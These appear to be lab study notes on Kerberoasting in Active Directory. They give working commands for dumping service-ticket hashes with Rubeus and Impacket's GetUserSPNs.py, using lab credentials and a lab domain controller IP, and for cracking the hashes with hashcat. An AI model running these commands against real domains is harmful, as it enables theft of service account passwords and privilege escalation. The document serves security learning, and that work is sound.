
## Kerberoasting w/ Rubeus & Impacket

## Method 1: Rubeus

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

(note: There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.)


`Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users.
format the hash into txt file, delete tabs/spaces and save as Hash.txt
Crack the hash password with `Hashcat` (*paste with P in visual mode*)
`hashcat -m 13100 -a 0 hash.txt Pass.txt`


## Method 2: Impacket


Kerberoasting w/ Impacket - 

1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.231.14 -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

